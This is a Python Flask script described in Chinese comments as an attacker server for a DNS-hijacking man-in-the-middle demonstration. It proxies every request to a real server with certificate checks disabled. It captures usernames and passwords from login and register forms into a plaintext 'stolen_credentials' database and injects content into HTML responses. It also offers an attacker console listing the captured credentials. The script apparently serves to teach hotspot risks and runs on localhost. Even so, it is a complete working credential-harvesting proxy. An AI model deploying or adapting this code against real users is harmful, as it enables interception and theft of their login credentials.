"""
攻击者服务器 — MITM 演示

DNS 劫持后，受害者流量被导向此服务器。
它做了三件事：
  1. 窃取登录凭证（明文记录到 attacker_db）
  2. 将请求转发给真实 Flask 服务器
  3. 篡改响应内容（展示中间人篡改风险）
"""
import os
import sqlite3
import threading
import time
import json

import requests
from flask import Flask, request, Response, g
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)
app.secret_key = 'attacker-secret'

# 真实服务器的地址（通过 TLS 连接真 nginx）
REAL_SERVER = 'https://127.0.0.1:443'
# 真 nginx 也是自签名证书，需要跳过验证
VERIFY_SSL = False

ATTACKER_DB = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'attacker_db.sqlite')


def get_attacker_db():
    if 'attacker_db' not in g:
        g.attacker_db = sqlite3.connect(ATTACKER_DB)
        g.attacker_db.row_factory = sqlite3.Row
    return g.attacker_db


def close_attacker_db(e=None):
    db = g.pop('attacker_db', None)
    if db is not None:
        db.close()


def init_attacker_db():
    db = sqlite3.connect(ATTACKER_DB)
    db.executescript('''
        CREATE TABLE IF NOT EXISTS stolen_credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username VARCHAR(80) NOT NULL,
            password VARCHAR(128) NOT NULL,
            victim_ip VARCHAR(45),
            victim_ua TEXT,
            captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
    ''')
    db.commit()
    db.close()


app.teardown_appcontext(close_attacker_db)
with app.app_context():
    init_attacker_db()


# ── 篡改内容注入 ──────────────────────────────────────────────

TAMPER_INJECTION = '''
<div style="background:#ff4444;color:#fff;padding:12px;text-align:center;
            font-weight:bold;font-size:16px;position:fixed;top:0;left:0;
            width:100%;z-index:99999;">
    ⚠️ 此页面内容已被中间人篡改！你正在遭受 MITM 攻击！
</div>
<div style="height:48px;"></div>
'''


def tamper_response(content, content_type):
    """在 HTML 响应中注入篡改警告条"""
    if 'text/html' not in (content_type or ''):
        return content

    text = content.decode('utf-8', errors='replace') if isinstance(content, bytes) else content
    # 在 <body> 之后立即注入
    if '<body>' in text:
        text = text.replace('<body>', '<body>' + TAMPER_INJECTION, 1)
    elif '<html' in text:
        text = text.replace('<html', '<html>' + TAMPER_INJECTION, 1)
    return text.encode('utf-8')


# ── 全局拦截 ──────────────────────────────────────────────────

@app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
def mitm_proxy(path):
    """MITM 代理核心：拦截所有请求，窃取凭证，转发，篡改响应"""
    target_url = f'{REAL_SERVER}/{path}'
    if request.query_string:
        target_url += f'?{request.query_string.decode()}'

    headers = dict(request.headers)
    # 移除 hop-by-hop 头
    for key in ['Host', 'Connection', 'Transfer-Encoding', 'Content-Length']:
        headers.pop(key, None)

    method = request.method
    data = request.get_data()

    # ── ① 窃取登录/注册凭证 ─────────────────────────────
    if method == 'POST' and ('login' in path or 'register' in path):
        form_data = request.form.to_dict()
        username = form_data.get('username', '')
        password = form_data.get('password', '')

        if username or password:
            victim_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            victim_ua = request.user_agent.string if request.user_agent else ''

            db = get_attacker_db()
            db.execute(
                'INSERT INTO stolen_credentials (username, password, victim_ip, victim_ua) VALUES (?, ?, ?, ?)',
                (username, password, victim_ip, victim_ua)
            )
            db.commit()

            # 实时打印到终端
            print(f'\n*** [凭证窃取] 用户名: {username} | 密码: {password}')
            print(f'    IP: {victim_ip} | UA: {victim_ua[:80]}')

    # ── ② 转发给真实服务器 ─────────────────────────────
    try:
        if method == 'GET':
            resp = requests.get(target_url, headers=headers, allow_redirects=False,
                                    timeout=10, verify=VERIFY_SSL)
        elif method == 'POST':
            resp = requests.post(target_url, data=data, headers=headers, allow_redirects=False,
                                     timeout=10, verify=VERIFY_SSL)
        else:
            resp = requests.request(method, target_url, data=data, headers=headers,
                                    allow_redirects=False, timeout=10, verify=VERIFY_SSL)
    except requests.RequestException as e:
        return f'[攻击者服务器错误] 无法连接真实服务器: {e}', 502

    # ── ③ 篡改响应 ─────────────────────────────────────
    content_type = resp.headers.get('Content-Type', '')
    tampered_body = tamper_response(resp.content, content_type)

    excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
    response_headers = [(k, v) for k, v in resp.headers.items()
                        if k.lower() not in excluded_headers]

    return Response(tampered_body, status=resp.status_code, headers=response_headers)


# ── 攻击者日志查看 ──────────────────────────────────────────

@app.route('/attacker-log')
def attacker_log():
    """攻击者查看窃取到的凭证"""
    db = get_attacker_db()
    credentials = db.execute(
        'SELECT * FROM stolen_credentials ORDER BY captured_at DESC'
    ).fetchall()

    rows_html = ''
    for c in credentials:
        rows_html += f'''
        <tr>
            <td>{c["id"]}</td>
            <td><code>{c["username"]}</code></td>
            <td style="color:#ff4444;font-weight:bold;font-family:monospace;">{c["password"]}</td>
            <td><small>{c["victim_ip"]}</small></td>
            <td><small>{c["victim_ua"][:60] if c["victim_ua"] else "N/A"}</small></td>
            <td><small>{c["captured_at"]}</small></td>
        </tr>'''

    return f'''
    <!DOCTYPE html>
    <html lang="zh-CN">
    <head><meta charset="UTF-8"><title>攻击者控制台</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    </head>
    <body class="bg-dark text-white">
    <div class="container mt-4">
        <h2>攻击者控制台 — 窃取的凭证</h2>
        <div class="alert alert-danger">
            以下所有密码均为<b>明文</b>！在真实的 MITM 攻击中，攻击者看到的就是这些数据。
        </div>
        <table class="table table-dark table-bordered table-hover">
        <thead><tr><th>#</th><th>用户名</th><th>密码（明文）</th><th>IP</th><th>User-Agent</th><th>时间</th></tr></thead>
        <tbody>{rows_html}</tbody>
        </table>
        <p class="text-muted small">
            正常访问：经过 Cloudflare（CA 证书）
            &nbsp;|&nbsp;
            恶意热点：DNS 劫持 → 攻击者服务器（自签名证书）
        </p>
    </div></body></html>'''


# ── 启动 ──────────────────────────────────────────────────────

if __name__ == '__main__':
    print('*** 攻击者服务器启动...')
    print(f'    监听: 127.0.0.1:5001')
    print(f'    转发目标: {REAL_SERVER}')
    print(f'    攻击者日志: http://127.0.0.1:5001/attacker-log')
    print(f'    窃取的凭证会实时打印在下方:')
    print('-' * 55)
    app.run(debug=False, host='127.0.0.1', port=5001)
